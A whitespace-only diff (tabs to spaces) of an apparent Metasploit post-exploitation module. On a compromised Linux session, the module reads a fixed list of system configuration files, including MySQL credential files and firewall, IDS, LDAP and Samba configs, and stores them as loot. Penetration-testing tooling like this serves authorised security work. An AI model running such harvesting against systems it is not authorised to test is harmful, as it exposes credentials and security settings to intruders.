@@ -28,53 +28,53 @@ class Metasploit3 < Msf::Post
 		))
 	end
 
-	def run
-		distro = get_sysinfo
-		h = get_host
-		print_status("Running module against #{h}")
-		print_status("Info:")
-		print_status("\t#{distro[:version]}")
-		print_status("\t#{distro[:kernel]}")
+  def run
+    distro = get_sysinfo
+    h = get_host
+    print_status("Running module against #{h}")
+    print_status("Info:")
+    print_status("\t#{distro[:version]}")
+    print_status("\t#{distro[:kernel]}")
 
-		vprint_status("Finding configuration files...")
-		find_configs
-	end
+    vprint_status("Finding configuration files...")
+    find_configs
+  end
 
-	def save(file, data, ctype="text/plain")
-		ltype = "linux.enum.conf"
-		fname = ::File.basename(file)
-		loot = store_loot(ltype, ctype, session, data, fname)
-		print_status("#{fname} stored in #{loot.to_s}")
-	end
+  def save(file, data, ctype="text/plain")
+    ltype = "linux.enum.conf"
+    fname = ::File.basename(file)
+    loot = store_loot(ltype, ctype, session, data, fname)
+    print_status("#{fname} stored in #{loot.to_s}")
+  end
 
-	def get_host
-		case session.type
-		when /meterpreter/
-			host = sysinfo["Computer"]
-		when /shell/
-			host = session.shell_command_token("hostname").chomp
-		end
+  def get_host
+    case session.type
+    when /meterpreter/
+      host = sysinfo["Computer"]
+    when /shell/
+      host = session.shell_command_token("hostname").chomp
+    end
 
-		return host
-	end
+    return host
+  end
 
-	def find_configs
-		configs =[
-			"/etc/apache2/apache2.conf", "/etc/apache2/ports.conf", "/etc/nginx/nginx.conf",
-			"/etc/snort/snort.conf", "/etc/mysql/my.cnf", "/etc/ufw/ufw.conf",
-			"/etc/ufw/sysctl.conf", "/etc/security.access.conf", "/etc/shells",
-			"/etc/security/sepermit.conf", "/etc/ca-certificates.conf", "/etc/security/access.conf",
-			"/etc/gated.conf", "/etc/rpc", "/etc/psad/psad.conf", "/etc/mysql/debian.cnf",
-			"/etc/chkrootkit.conf", "/etc/logrotate.conf", "/etc/rkhunter.conf",
-			"/etc/samba/smb.conf", "/etc/ldap/ldap.conf", "/etc/openldap/openldap.conf",
-			"/etc/cups/cups.conf", "/etc/opt/lampp/etc/httpd.conf", "/etc/sysctl.conf",
-			"/etc/proxychains.conf", "/etc/cups/snmp.conf", "/etc/mail/sendmail.conf",
-			"/etc/snmp/snmp.conf"
-		]
+  def find_configs
+    configs =[
+      "/etc/apache2/apache2.conf", "/etc/apache2/ports.conf", "/etc/nginx/nginx.conf",
+      "/etc/snort/snort.conf", "/etc/mysql/my.cnf", "/etc/ufw/ufw.conf",
+      "/etc/ufw/sysctl.conf", "/etc/security.access.conf", "/etc/shells",
+      "/etc/security/sepermit.conf", "/etc/ca-certificates.conf", "/etc/security/access.conf",
+      "/etc/gated.conf", "/etc/rpc", "/etc/psad/psad.conf", "/etc/mysql/debian.cnf",
+      "/etc/chkrootkit.conf", "/etc/logrotate.conf", "/etc/rkhunter.conf",
+      "/etc/samba/smb.conf", "/etc/ldap/ldap.conf", "/etc/openldap/openldap.conf",
+      "/etc/cups/cups.conf", "/etc/opt/lampp/etc/httpd.conf", "/etc/sysctl.conf",
+      "/etc/proxychains.conf", "/etc/cups/snmp.conf", "/etc/mail/sendmail.conf",
+      "/etc/snmp/snmp.conf"
+    ]
 
-		configs.each do |f|
-			output = read_file("#{f}")
-			save(f,  output) if output !~ /No such file or directory/
-		end
-	end
+    configs.each do |f|
+      output = read_file("#{f}")
+      save(f,  output) if output !~ /No such file or directory/
+    end
+  end
 end
